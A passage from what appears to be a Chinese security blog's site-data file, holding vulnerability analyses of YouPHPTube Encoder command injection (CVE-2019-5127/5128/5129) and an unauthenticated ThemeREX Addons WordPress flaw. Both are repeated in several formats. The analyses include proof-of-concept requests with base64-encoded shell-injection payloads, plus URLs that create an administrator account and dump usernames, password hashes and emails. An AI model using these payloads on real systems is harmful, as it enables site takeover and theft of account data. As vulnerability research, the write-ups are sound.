，待转换的视频地址由\\$url变量值提供。这里的\\$url值可以通过GET变量传入，而未经过任何过滤\n\n\\$exec变量在拼接完成后，在后文被执行\n\n![MVCkYq.png](https://s2.ax1x.com/2019/11/08/MVCkYq.png)\n\n如上图可见，\\$exec变量被拼接后传递给\\$cmd\n\n程序通过exec方法将\\$cmd变量中的内容执行\n\n由于程序未使用escapeshellage或是escapeshellcmd进行过滤，导致远程代码执行漏洞的产生\n\n#### POC\n\n利用如下poc，即可对系统进行测试\n\nGET /YouPHPTube-Encoder/objects/getImage.php?base64Url=\n\nYGVjaG8gdGVzdCB8IHRlZSAtYSBrdW1hbW9uLmZ1bmA=&format=png\n\n### CVE-2019-5128\n\n接下来看下CVE-2019-5128\n\n[![MVCAf0.md.png](https://s2.ax1x.com/2019/11/08/MVCAf0.md.png)](https://imgchr.com/i/MVCAf0)\n\n根据cve描述，可以确定漏洞存在的位置：\\\\objects\\\\getImageMP4.php\n\n存在漏洞的参数：base64Url\n\ngetImageMP4.php\n\n[![MVCPTs.md.png](https://s2.ax1x.com/2019/11/08/MVCPTs.md.png)](https://imgchr.com/i/MVCPTs)\n\n存在问题的参数仍然是base64Url，如上图\n\n同上一个CVE类似，最终未经过滤，被拼接语句执行\n\n[![MVCZlT.md.png](https://s2.ax1x.com/2019/11/08/MVCZlT.md.png)](https://imgchr.com/i/MVCZlT)\n\n#### POC\n\n利用如下poc，即可对系统进行测试\n\nGET\n/YouPHPTube-Encoder/objects/getImageMP4.php?base64Url=YGVjaG8gMTIzIHwgdGVlIC1hIHRoaXNzeXN0ZW1oYXZlYmVlbmV4cGxvaXRlZDEyMzRg&format=jpg\n\n### CVE-2019-5129\n\n最后看下CVE-2019-5129\n\n[![MVC9mQ.md.png](https://s2.ax1x.com/2019/11/08/MVC9mQ.md.png)](https://imgchr.com/i/MVC9mQ)\n\n根据cve描述，可以确定漏洞存在的位置：\\\\objects\\\\ getSpiritsFromVideo.php\n\n存在漏洞的参数：base64Url\n\ngetSpiritsFromVideo.php\n\n![MVCSOg.png](https://s2.ax1x.com/2019/11/08/MVCSOg.png)\n\n存在问题的参数为base64Url，如上图\n\n[![MVCK0J.md.png](https://s2.ax1x.com/2019/11/08/MVCK0J.md.png)](https://imgchr.com/i/MVCK0J)\n\n拼接命令，在未经过滤的情况下，通过exec执行命令\n\n#### POC\n\n利用如下poc，即可对系统进行测试\n\n/YouPHPTube-Encoder/objects/getSpiritsFromVideo.php?base64Url=YGVjaG8gMTIzIHwgdGVlIC1hIHRoaXNzeXN0ZW1oYXZlYmVlbmV4cGxvaXRlZDEyMzRg&format=jpg\n\n修复：\n\n官方暂时仍未修复以上漏洞","slug":"YouPHPTube-Encoder","published":1,"updated":"2020-10-27T09:25:30.104Z","_id":"ckgrozu8z002cwsa96fqs36o9","comments":1,"layout":"post","photos":[],"link":"","content":"<p>近日，思科Talos漏洞报告指出，YouPHPTube Encoder应用存在多处命令注入漏洞。CVE编号分别为CVE-2019-5127 / CVE-2019-5128 / CVE-2019-5129</p>\n<a id=\"more\"></a>\n\n<h2 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h2><p>YouPHPTube是一个开源的视频共享网站应用。使用YouPHPTube，用户可以创建自己的视频共享网站，YouPHPTube 将帮助用户导入和编码来自Youtube，Vimeo 等其他网站的视频，用户可以直接在自己的网站上进行分享。</p>\n<p>YouPHPTube Encoder是YouPHPTube的编码器插件，该插件可在YouPHPTube中提供编码器功能。使用者在自己的服务器上安装并使用YouPHPTube Encoder以取代第三方公共编码器服务器，可以更快速便捷的编码自己的视频，并且还可以使用私有方式对自己的视频进行编码</p>\n<p><a href=\"https://imgchr.com/i/MVCum4\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/08/MVCum4.md.png\" alt=\"MVCum4.md.png\"></a></p>\n<p>在YouPHPTube Encoder2.3中，存在无需身份验证的命令注入漏洞。攻击者可以发送包含特定参数的Web请求来触发这些漏洞。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><h3 id=\"ffmpeg\"><a href=\"#ffmpeg\" class=\"headerlink\" title=\"ffmpeg\"></a>ffmpeg</h3><p>YouPHPTube-Encoder对视频进行处理的核心部分是使用ffmpeg，本次三个漏洞的产生，也是因为YouPHPTube-Encoder底层在执行ffmpeg命令时，没有进行参数过滤导致的。</p>\n<p>FFmpeg是一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。采用LGPL或GPL许可证。它提供了录制、转换以及流化音视频的完整解决方案。它包含了非常先进的音频/视频编解码库libavcodec，为了保证高可移植性和编解码质量，libavcodec里很多code都是从头开发的。</p>\n<p>ffmpeg下载地址:</p>\n<p><a href=\"http://ffmpeg.org/download.html\">http://ffmpeg.org/download.html</a></p>\n<p>FFmpeg使用方式</p>\n<p><a href=\"https://imgchr.com/i/MVClkR\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/08/MVClkR.md.png\" alt=\"MVClkR.md.png\"></a></p>\n<p>使用案例：</p>\n<p>从视频中截取一张352x240尺寸大小的，格式为jpg的图片   </p>\n<p>ffmpeg -i test.asf -y -f image2 -t 0.001 -s 352x240 a.jpg</p>\n<h3 id=\"CVE-2019-5127\"><a href=\"#CVE-2019-5127\" class=\"headerlink\" title=\"CVE-2019-5127\"></a>CVE-2019-5127</h3><p>首先来看下CVE-2019-5127</p>\n<p><a href=\"https://imgchr.com/i/MVCCwj\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/08/MVCCwj.md.png\" alt=\"MVCCwj.md.png\"></a></p>\n<p>根据cve描述，可以确定漏洞存在的位置：\\objects\\getImage.php</p>\n<p>存在漏洞的参数：base64Url</p>\n<p>跟入getImage.php</p>\n<p><a href=\"https://imgchr.com/i/MVCPTs\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/08/MVCPTs.md.png\" alt=\"MVCPTs.md.png\"></a></p>\n<p>位于getImage.php文件25行处，可见从GET请求中读取base64Url参数，并将其base64解码，随后赋值给url变量，这里的base64Url参数便是CVE描述中所说的存在漏洞的参数</p>\n<p><a href=\"https://imgchr.com/i/MVCFkn\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/08/MVCFkn.md.png\" alt=\"MVCFkn.md.png\"></a></p>\n<p>通过GET请求中format参数的不同，选择不同的if分支进行视频处理</p>\n<p>我们以format参数值为png举例，如上图红框处</p>\n<p>ffmpeg -i {$url} -f image2 -s 400x225 -vframes 1 -y {$destination}</p>\n<p>把视频的前1帧转换成一张400x225尺寸大小的，格式为jpg的图片 ，待转换的视频地址由$url变量值提供。这里的$url值可以通过GET变量传入，而未经过任何过滤</p>\n<p>$exec变量在拼接完成后，在后文被执行</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/08/MVCkYq.png\" alt=\"MVCkYq.png\"></p>\n<p>如上图可见，$exec变量被拼接后传递给$cmd</p>\n<p>程序通过exec方法将$cmd变量中的内容执行</p>\n<p>由于程序未使用escapeshellage或是escapeshellcmd进行过滤，导致远程代码执行漏洞的产生</p>\n<h4 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC\"></a>POC</h4><p>利用如下poc，即可对系统进行测试</p>\n<p>GET /YouPHPTube-Encoder/objects/getImage.php?base64Url=</p>\n<p>YGVjaG8gdGVzdCB8IHRlZSAtYSBrdW1hbW9uLmZ1bmA=&amp;format=png</p>\n<h3 id=\"CVE-2019-5128\"><a href=\"#CVE-2019-5128\" class=\"headerlink\" title=\"CVE-2019-5128\"></a>CVE-2019-5128</h3><p>接下来看下CVE-2019-5128</p>\n<p><a href=\"https://imgchr.com/i/MVCAf0\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/08/MVCAf0.md.png\" alt=\"MVCAf0.md.png\"></a></p>\n<p>根据cve描述，可以确定漏洞存在的位置：\\objects\\getImageMP4.php</p>\n<p>存在漏洞的参数：base64Url</p>\n<p>getImageMP4.php</p>\n<p><a href=\"https://imgchr.com/i/MVCPTs\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/08/MVCPTs.md.png\" alt=\"MVCPTs.md.png\"></a></p>\n<p>存在问题的参数仍然是base64Url，如上图</p>\n<p>同上一个CVE类似，最终未经过滤，被拼接语句执行</p>\n<p><a href=\"https://imgchr.com/i/MVCZlT\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/08/MVCZlT.md.png\" alt=\"MVCZlT.md.png\"></a></p>\n<h4 id=\"POC-1\"><a href=\"#POC-1\" class=\"headerlink\" title=\"POC\"></a>POC</h4><p>利用如下poc，即可对系统进行测试</p>\n<p>GET<br>/YouPHPTube-Encoder/objects/getImageMP4.php?base64Url=YGVjaG8gMTIzIHwgdGVlIC1hIHRoaXNzeXN0ZW1oYXZlYmVlbmV4cGxvaXRlZDEyMzRg&amp;format=jpg</p>\n<h3 id=\"CVE-2019-5129\"><a href=\"#CVE-2019-5129\" class=\"headerlink\" title=\"CVE-2019-5129\"></a>CVE-2019-5129</h3><p>最后看下CVE-2019-5129</p>\n<p><a href=\"https://imgchr.com/i/MVC9mQ\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/08/MVC9mQ.md.png\" alt=\"MVC9mQ.md.png\"></a></p>\n<p>根据cve描述，可以确定漏洞存在的位置：\\objects\\ getSpiritsFromVideo.php</p>\n<p>存在漏洞的参数：base64Url</p>\n<p>getSpiritsFromVideo.php</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/08/MVCSOg.png\" alt=\"MVCSOg.png\"></p>\n<p>存在问题的参数为base64Url，如上图</p>\n<p><a href=\"https://imgchr.com/i/MVCK0J\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/08/MVCK0J.md.png\" alt=\"MVCK0J.md.png\"></a></p>\n<p>拼接命令，在未经过滤的情况下，通过exec执行命令</p>\n<h4 id=\"POC-2\"><a href=\"#POC-2\" class=\"headerlink\" title=\"POC\"></a>POC</h4><p>利用如下poc，即可对系统进行测试</p>\n<p>/YouPHPTube-Encoder/objects/getSpiritsFromVideo.php?base64Url=YGVjaG8gMTIzIHwgdGVlIC1hIHRoaXNzeXN0ZW1oYXZlYmVlbmV4cGxvaXRlZDEyMzRg&amp;format=jpg</p>\n<p>修复：</p>\n<p>官方暂时仍未修复以上漏洞</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>近日，思科Talos漏洞报告指出，YouPHPTube Encoder应用存在多处命令注入漏洞。CVE编号分别为CVE-2019-5127 / CVE-2019-5128 / CVE-2019-5129</p>","more":"<h2 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h2><p>YouPHPTube是一个开源的视频共享网站应用。使用YouPHPTube，用户可以创建自己的视频共享网站，YouPHPTube 将帮助用户导入和编码来自Youtube，Vimeo 等其他网站的视频，用户可以直接在自己的网站上进行分享。</p>\n<p>YouPHPTube Encoder是YouPHPTube的编码器插件，该插件可在YouPHPTube中提供编码器功能。使用者在自己的服务器上安装并使用YouPHPTube Encoder以取代第三方公共编码器服务器，可以更快速便捷的编码自己的视频，并且还可以使用私有方式对自己的视频进行编码</p>\n<p><a href=\"https://imgchr.com/i/MVCum4\"><img src=\"https://s2.ax1x.com/2019/11/08/MVCum4.md.png\" alt=\"MVCum4.md.png\"></a></p>\n<p>在YouPHPTube Encoder2.3中，存在无需身份验证的命令注入漏洞。攻击者可以发送包含特定参数的Web请求来触发这些漏洞。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><h3 id=\"ffmpeg\"><a href=\"#ffmpeg\" class=\"headerlink\" title=\"ffmpeg\"></a>ffmpeg</h3><p>YouPHPTube-Encoder对视频进行处理的核心部分是使用ffmpeg，本次三个漏洞的产生，也是因为YouPHPTube-Encoder底层在执行ffmpeg命令时，没有进行参数过滤导致的。</p>\n<p>FFmpeg是一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。采用LGPL或GPL许可证。它提供了录制、转换以及流化音视频的完整解决方案。它包含了非常先进的音频/视频编解码库libavcodec，为了保证高可移植性和编解码质量，libavcodec里很多code都是从头开发的。</p>\n<p>ffmpeg下载地址:</p>\n<p><a href=\"http://ffmpeg.org/download.html\">http://ffmpeg.org/download.html</a></p>\n<p>FFmpeg使用方式</p>\n<p><a href=\"https://imgchr.com/i/MVClkR\"><img src=\"https://s2.ax1x.com/2019/11/08/MVClkR.md.png\" alt=\"MVClkR.md.png\"></a></p>\n<p>使用案例：</p>\n<p>从视频中截取一张352x240尺寸大小的，格式为jpg的图片   </p>\n<p>ffmpeg -i test.asf -y -f image2 -t 0.001 -s 352x240 a.jpg</p>\n<h3 id=\"CVE-2019-5127\"><a href=\"#CVE-2019-5127\" class=\"headerlink\" title=\"CVE-2019-5127\"></a>CVE-2019-5127</h3><p>首先来看下CVE-2019-5127</p>\n<p><a href=\"https://imgchr.com/i/MVCCwj\"><img src=\"https://s2.ax1x.com/2019/11/08/MVCCwj.md.png\" alt=\"MVCCwj.md.png\"></a></p>\n<p>根据cve描述，可以确定漏洞存在的位置：\\objects\\getImage.php</p>\n<p>存在漏洞的参数：base64Url</p>\n<p>跟入getImage.php</p>\n<p><a href=\"https://imgchr.com/i/MVCPTs\"><img src=\"https://s2.ax1x.com/2019/11/08/MVCPTs.md.png\" alt=\"MVCPTs.md.png\"></a></p>\n<p>位于getImage.php文件25行处，可见从GET请求中读取base64Url参数，并将其base64解码，随后赋值给url变量，这里的base64Url参数便是CVE描述中所说的存在漏洞的参数</p>\n<p><a href=\"https://imgchr.com/i/MVCFkn\"><img src=\"https://s2.ax1x.com/2019/11/08/MVCFkn.md.png\" alt=\"MVCFkn.md.png\"></a></p>\n<p>通过GET请求中format参数的不同，选择不同的if分支进行视频处理</p>\n<p>我们以format参数值为png举例，如上图红框处</p>\n<p>ffmpeg -i {$url} -f image2 -s 400x225 -vframes 1 -y {$destination}</p>\n<p>把视频的前1帧转换成一张400x225尺寸大小的，格式为jpg的图片 ，待转换的视频地址由$url变量值提供。这里的$url值可以通过GET变量传入，而未经过任何过滤</p>\n<p>$exec变量在拼接完成后，在后文被执行</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/08/MVCkYq.png\" alt=\"MVCkYq.png\"></p>\n<p>如上图可见，$exec变量被拼接后传递给$cmd</p>\n<p>程序通过exec方法将$cmd变量中的内容执行</p>\n<p>由于程序未使用escapeshellage或是escapeshellcmd进行过滤，导致远程代码执行漏洞的产生</p>\n<h4 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC\"></a>POC</h4><p>利用如下poc，即可对系统进行测试</p>\n<p>GET /YouPHPTube-Encoder/objects/getImage.php?base64Url=</p>\n<p>YGVjaG8gdGVzdCB8IHRlZSAtYSBrdW1hbW9uLmZ1bmA=&amp;format=png</p>\n<h3 id=\"CVE-2019-5128\"><a href=\"#CVE-2019-5128\" class=\"headerlink\" title=\"CVE-2019-5128\"></a>CVE-2019-5128</h3><p>接下来看下CVE-2019-5128</p>\n<p><a href=\"https://imgchr.com/i/MVCAf0\"><img src=\"https://s2.ax1x.com/2019/11/08/MVCAf0.md.png\" alt=\"MVCAf0.md.png\"></a></p>\n<p>根据cve描述，可以确定漏洞存在的位置：\\objects\\getImageMP4.php</p>\n<p>存在漏洞的参数：base64Url</p>\n<p>getImageMP4.php</p>\n<p><a href=\"https://imgchr.com/i/MVCPTs\"><img src=\"https://s2.ax1x.com/2019/11/08/MVCPTs.md.png\" alt=\"MVCPTs.md.png\"></a></p>\n<p>存在问题的参数仍然是base64Url，如上图</p>\n<p>同上一个CVE类似，最终未经过滤，被拼接语句执行</p>\n<p><a href=\"https://imgchr.com/i/MVCZlT\"><img src=\"https://s2.ax1x.com/2019/11/08/MVCZlT.md.png\" alt=\"MVCZlT.md.png\"></a></p>\n<h4 id=\"POC-1\"><a href=\"#POC-1\" class=\"headerlink\" title=\"POC\"></a>POC</h4><p>利用如下poc，即可对系统进行测试</p>\n<p>GET<br>/YouPHPTube-Encoder/objects/getImageMP4.php?base64Url=YGVjaG8gMTIzIHwgdGVlIC1hIHRoaXNzeXN0ZW1oYXZlYmVlbmV4cGxvaXRlZDEyMzRg&amp;format=jpg</p>\n<h3 id=\"CVE-2019-5129\"><a href=\"#CVE-2019-5129\" class=\"headerlink\" title=\"CVE-2019-5129\"></a>CVE-2019-5129</h3><p>最后看下CVE-2019-5129</p>\n<p><a href=\"https://imgchr.com/i/MVC9mQ\"><img src=\"https://s2.ax1x.com/2019/11/08/MVC9mQ.md.png\" alt=\"MVC9mQ.md.png\"></a></p>\n<p>根据cve描述，可以确定漏洞存在的位置：\\objects\\ getSpiritsFromVideo.php</p>\n<p>存在漏洞的参数：base64Url</p>\n<p>getSpiritsFromVideo.php</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/08/MVCSOg.png\" alt=\"MVCSOg.png\"></p>\n<p>存在问题的参数为base64Url，如上图</p>\n<p><a href=\"https://imgchr.com/i/MVCK0J\"><img src=\"https://s2.ax1x.com/2019/11/08/MVCK0J.md.png\" alt=\"MVCK0J.md.png\"></a></p>\n<p>拼接命令，在未经过滤的情况下，通过exec执行命令</p>\n<h4 id=\"POC-2\"><a href=\"#POC-2\" class=\"headerlink\" title=\"POC\"></a>POC</h4><p>利用如下poc，即可对系统进行测试</p>\n<p>/YouPHPTube-Encoder/objects/getSpiritsFromVideo.php?base64Url=YGVjaG8gMTIzIHwgdGVlIC1hIHRoaXNzeXN0ZW1oYXZlYmVlbmV4cGxvaXRlZDEyMzRg&amp;format=jpg</p>\n<p>修复：</p>\n<p>官方暂时仍未修复以上漏洞</p>"},{"title":"WordpPress ThemeREX Addons 插件安全漏洞深度分析","toc":true,"date":"2020-03-19T06:31:04.000Z","categorise":"技术","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b1a45f1a3354e3866821d82b1cb2550.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nThemeREX是一家专门出售商业WordPress主题的公司。ThemeREX Addons插件为ThemeREX公司开发的预装在所有ThemeREX商业主题中用来帮助其用户设置新站点和控制不同的主题的一款插件。根据相关预测，该插件预装在超过44000个网站上。\n\n<!--more-->\n\n![8rvrSf.png](https://s1.ax1x.com/2020/03/19/8rvrSf.png)\n\n**0x01 漏洞描述**\n-----------------\n\nWordPress ThemeREX Addons 2020-03-09之前版本中存在安全漏洞。未经授权的攻击者可利用该漏洞在后台添加一个管理员账号、或是查看所有账号信息等操作。\n\n**0x02 漏洞分析**\n-----------------\n\n根据相关披露，漏洞应该存在于plugin.rest-api.php文件中\n\n我们首先来看一下\\\\wp-content\\\\plugins\\\\trx_addons\\\\includes\\\\plugin.rest-api.php文件中的代码\n\n位于该文件40行处，存在一处trx_addons_rest_get_sc_layout方法，如下图\n\n![8rv0Yt.png](https://s1.ax1x.com/2020/03/19/8rv0Yt.png)\n\n在该方法中，存在一处明显的漏洞点，见下图代码块\n\n![8rvsl8.png](https://s1.ax1x.com/2020/03/19/8rvsl8.png)\n\n接下来我们根据这段代码详细分析下。我们首先来观察一下下图53行红框处\n\n![8rvy6S.png](https://s1.ax1x.com/2020/03/19/8rvy6S.png)\n\n位于上图红框处，可见程序从请求中直接获得参数，并将请求中的参数键值对赋值与\\$params数组。这将导致\\$params数组可控\n\n紧接着，程序判断\\$params数组中是否存在名为’sc’的键名，见下图红框处\n\n![8rv8SK.png](https://s1.ax1x.com/2020/03/19/8rv8SK.png)\n\n若该键名存在，经过字符替换处理后将其值赋与\\$sc变量。\n\n简单来说，这里的\\$sc变量可以通过请求中的sc参数进行传递。\n\n随后，程序通过function_exists判断\\$sc变量对应的方法是否存在，见下图\n\n![8rvaTA.png](https://s1.ax1x.com/2020/03/19/8rvaTA.png)\n\n如果\\$sc变量中对应的方法存在，程序将\\$params数组作为参数列表传入该方法执行。\n\n至此，漏洞的触发点我们已经分析完毕。接下来我们需要寻找一下调用链\n\n由于漏洞触发点位于trx_addons_rest_get_sc_layout方法中，我们需要分析一下如何构造请求以触发这个漏洞。\n\n仍然是位于\\\\wp-content\\\\plugins\\\\trx_addons\\\\includes\\\\plugin.rest-api.php文件中，有着如下代码\n\n![8rveL4.png](https://s1.ax1x.com/2020/03/19/8rveL4.png)\n\n通过上图可见，程序通过add_action方法将trx_addons_rest_register_endpoints函数挂接到rest_api_init动作上。\n\n我们查看一下rest_api_init这个动作\n\n![8rvkWV.png](https://s1.ax1x.com/2020/03/19/8rvkWV.png)\n\n通过上图描述不难看出：\nrest_api_init动作将会在API请求发送到服务器后，服务器初始化处理API请求时触发。将trx_addons_rest_register_endpoints函数挂接到rest_api_init动作上，当有API请求发送到后台处理时，trx_addons_rest_register_endpoints方法将会被加载。\n\n继续跟踪后续代码\n\n![8rvRTs.png](https://s1.ax1x.com/2020/03/19/8rvRTs.png)\n\n在trx_addons_rest_register_endpoints方法中通过register_rest_route方法注册了一个自定义接口，见上图红框处。\n\n这里简单介绍一下register_rest_route方法：\n\nWordPress官方核心代码提供了一套WP_REST_API接口，但是实际开发以及使用过程中难免会出现官方API接口满足不了实际需求的状况。为此WordPress提供了register_rest_route方法用于自定义注册WP\nREST API接口。\n\nregister_rest_route方法参数如下\n\n![8rvfkn.png](https://s1.ax1x.com/2020/03/19/8rvfkn.png)\n\n在介绍完register_rest_route方法后，我们回归漏洞代码，分析此处register_rest_route方法注册的API接口\n\n![8rvQF1.png](https://s1.ax1x.com/2020/03/19/8rvQF1.png)\n\n通过上图第一个红框处namespace以及route属性值可知：该接口路由为trx_addons/v2/get/sc_layout；通过第二个红框methods属性值可知：该接口可以通过GET\\\\POST方法访问；通过第三个红框callback属性值可知：该接口回调函数为漏洞触发点trx_addons_rest_get_sc_layout方法。通过上述信息，我们可以构造出通往漏洞触发点的请求。\n\n除了通过分析代码来请求这种方法外，我们还可以通过wordpress还提供的接口来方便快捷的查看所有注册的API接口信息。\n\n访问127.0.0.1/wordpress/wp-json/ 见下图\n\n![8rvJyD.png](https://s1.ax1x.com/2020/03/19/8rvJyD.png)\n\nwp-json这个目录会将wordpress中所有注册的API接口信息展示出来。\n\n通过页面中展示的API列表，我们可以看见/trx_addons/v2/get/sc_layout路由信息\n\n展开/trx_addons/v2/get/sc_layout路由 见下图\n\n![8rv2wj.png](https://s1.ax1x.com/2020/03/19/8rv2wj.png)\n\n上图为展开后的详细接口信息，在这里我们可以看到该接口允许的methods以及url地址\n\n值得注意的是：通过分析 /trx_addons/v2/get/sc_layout接口代码时可发现，ThemeREX\nAddons插件并没有在代码中使用current_user_can等方法对接口进行权限校验。也就是说，未经身份验证的用户也可以访问该接口从而触发漏洞\n\n**0x03 漏洞利用**\n-----------------\n\n通过上文的分析可知，我们可以通过请求来控制待执行的函数名，并可以通过一个数组对该函数传参。因此我们需要找到一个可以利用的PHP或wordpress函数，该函数需要满足可以接收并处理数组类型参数\n\n### 利用一：通过wp_insert_user新建管理员账号\n\n构造如下链接：\n\n<http://127.0.0.1/wordpress/?rest_route=/trx_addons/v2/get/sc_layout&sc=wp_insert_user&role=administrator&user_login=TEST&user_pass=TEST>\n\n不需要进行登录操作，直接访问以上链接即可成功利用。\n\n根据上文漏洞分析一章可知，该链接最终会触发trx_addons_rest_get_sc_layout方法，见下图\n\n![8rvAzT.png](https://s1.ax1x.com/2020/03/19/8rvAzT.png)\n\n此时上图中的\\$sc参数值对应payload中sc值，为wp_insert_user\n\n此时\\$params数组值如下图\n\n![8rvlJx.png](https://s1.ax1x.com/2020/03/19/8rvlJx.png)\n\n程序将\\$params数组作为参数传入wp_insert_user方法并执行wp_insert_user方法。\n\nwp_insert_user方法可以为wordpress程序添加一个指定权限的用户，该方法接收一个数组作为参数满足触发漏洞的要求，见下图\n\n![8rvVQU.png](https://s1.ax1x.com/2020/03/19/8rvVQU.png)\n\nwp_insert_user方法参数说明如下\n\n![8rvYOe.png](https://s1.ax1x.com/2020/03/19/8rvYOe.png)\n\n由此一来，wordpress中将会增添一个administrator权限的名为TEST的用户，如下图\n\n![8rvuw9.png](https://s1.ax1x.com/2020/03/19/8rvuw9.png)\n\n利用新创建的管理员账号可以完成进一步攻击：例如通过修改wordpress模板等操作，在wordpress中写入后门文件。\n\n### 利用二：通过wp_dropdown_users查看所有账号信息\n\n构造如下链接：\n\n<http://127.0.0.1/wordpress/wp-json/trx_addons/v2/get/sc_layout?sc=wp_dropdown_users&show=user_login>\n\nwp_dropdown_users为wordpress提供的用来查询用户信息的函数\n\n![8rvUwd.png](https://s1.ax1x.com/2020/03/19/8rvUwd.png)\n\nwp_dropdown_users同样满足可以接收一个数组作为参数的需求，wp_dropdown_users参数说明如下\n\n![8rv1W6.png](https://s1.ax1x.com/2020/03/19/8rv1W6.png)\n\n通过wp_dropdown_users接口可以泄露wordpress账号信息。该操作同样不需要任何权限\n\n上述payload中指定show参数值为user_login，这样可以查看wordpress所有用户名，见下图\n\n![8rvNeH.png](https://s1.ax1x.com/2020/03/19/8rvNeH.png)\n\nshow参数值可以设置为user_pass来进行查看存储在数据库中加密后的密码，见下图\n\n![8rvwFI.png](https://s1.ax1x.com/2020/03/19/8rvwFI.png)\n\nshow参数值可以设置为user_email来进行查看邮箱，见下图\n\n![8rvGQO.png](https://s1.ax1x.com/2020/03/19/8rvGQO.png)\n\n**0x04 总结**\n-------------\n\n为了解决安全问题，ThemeREX选择将受影响的plugin.rest-api.php文件完全删除。plugin.rest-api.php文件是为了提供与Gutenberg插件的兼容性而设计，但在目前版本中Gutenberg插件已完全集成为WordPress核心。因此plugin.rest-api.php文件不再被需要，删除该文件不会影响到用户的正常使用。","source":"_posts/WordpPress-ThemeREX-Addons.md","raw":"---\ntitle: WordpPress ThemeREX Addons 插件安全漏洞深度分析\ntoc: true\ndate: 2020-03-19 14:31:04\ntags: web漏洞分析\ncategorise: 技术\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b1a45f1a3354e3866821d82b1cb2550.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nThemeREX是一家专门出售商业WordPress主题的公司。ThemeREX Addons插件为ThemeREX公司开发的预装在所有ThemeREX商业主题中用来帮助其用户设置新站点和控制不同的主题的一款插件。根据相关预测，该插件预装在超过44000个网站上。\n\n<!--more-->\n\n![8rvrSf.png](https://s1.ax1x.com/2020/03/19/8rvrSf.png)\n\n**0x01 漏洞描述**\n-----------------\n\nWordPress ThemeREX Addons 2020-03-09之前版本中存在安全漏洞。未经授权的攻击者可利用该漏洞在后台添加一个管理员账号、或是查看所有账号信息等操作。\n\n**0x02 漏洞分析**\n-----------------\n\n根据相关披露，漏洞应该存在于plugin.rest-api.php文件中\n\n我们首先来看一下\\\\wp-content\\\\plugins\\\\trx_addons\\\\includes\\\\plugin.rest-api.php文件中的代码\n\n位于该文件40行处，存在一处trx_addons_rest_get_sc_layout方法，如下图\n\n![8rv0Yt.png](https://s1.ax1x.com/2020/03/19/8rv0Yt.png)\n\n在该方法中，存在一处明显的漏洞点，见下图代码块\n\n![8rvsl8.png](https://s1.ax1x.com/2020/03/19/8rvsl8.png)\n\n接下来我们根据这段代码详细分析下。我们首先来观察一下下图53行红框处\n\n![8rvy6S.png](https://s1.ax1x.com/2020/03/19/8rvy6S.png)\n\n位于上图红框处，可见程序从请求中直接获得参数，并将请求中的参数键值对赋值与\\$params数组。这将导致\\$params数组可控\n\n紧接着，程序判断\\$params数组中是否存在名为’sc’的键名，见下图红框处\n\n![8rv8SK.png](https://s1.ax1x.com/2020/03/19/8rv8SK.png)\n\n若该键名存在，经过字符替换处理后将其值赋与\\$sc变量。\n\n简单来说，这里的\\$sc变量可以通过请求中的sc参数进行传递。\n\n随后，程序通过function_exists判断\\$sc变量对应的方法是否存在，见下图\n\n![8rvaTA.png](https://s1.ax1x.com/2020/03/19/8rvaTA.png)\n\n如果\\$sc变量中对应的方法存在，程序将\\$params数组作为参数列表传入该方法执行。\n\n至此，漏洞的触发点我们已经分析完毕。接下来我们需要寻找一下调用链\n\n由于漏洞触发点位于trx_addons_rest_get_sc_layout方法中，我们需要分析一下如何构造请求以触发这个漏洞。\n\n仍然是位于\\\\wp-content\\\\plugins\